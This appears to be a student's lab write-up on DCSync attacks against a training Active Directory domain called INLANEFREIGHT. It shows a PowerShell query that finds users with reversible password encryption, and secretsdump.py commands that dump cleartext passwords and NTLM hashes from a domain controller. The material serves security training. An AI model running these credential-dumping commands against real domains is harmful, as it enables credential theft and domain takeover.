# [DCSync](DCSync.md)
### Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
![](Screenshot%202026-05-29%20at%2015.34.54.png)
### What is this user's cleartext password?

```shell
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
![](Pasted%20image%2020260601192610.png)
### Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.

```shell
secretsdump.py -outputfile inlanefreight_hashes -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5
```
![](Pasted%20image%2020260601192627.png)
